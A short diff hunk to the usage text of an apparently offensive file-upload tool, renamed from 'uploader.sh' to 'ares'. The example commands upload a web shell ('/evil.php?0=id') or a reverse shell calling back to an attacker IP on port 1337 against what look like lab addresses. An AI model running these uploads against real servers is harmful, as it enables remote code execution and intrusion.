@@ -19,8 +19,8 @@ Uploader will run in interactive mode if you don't supply a value for required p
 	-b: Basic payload instead of a Reverse Shell. Provide commands as the value of the 0 parameter (e.g. /evil.php?0=id) . Incompatible with -e
 
 [Example Usage]
-	./uploader.sh -i 12.345.67.89 -p 1337 -u http://10.10.40.117/panel/ -n fileUpload -e http://10.10.40.117/uploads/ -a png
-	./uploader.sh -u http://10.10.40.117/panel/ -n fileUpload -b
+	ares -m upload -i 12.345.67.89 -p 1337 -u http://10.10.40.117/panel/ -n fileUpload -e http://10.10.40.117/uploads/ -a png
+	ares -m upload -u http://10.10.40.117/panel/ -n fileUpload -b
 
 [Supported File Types]
 
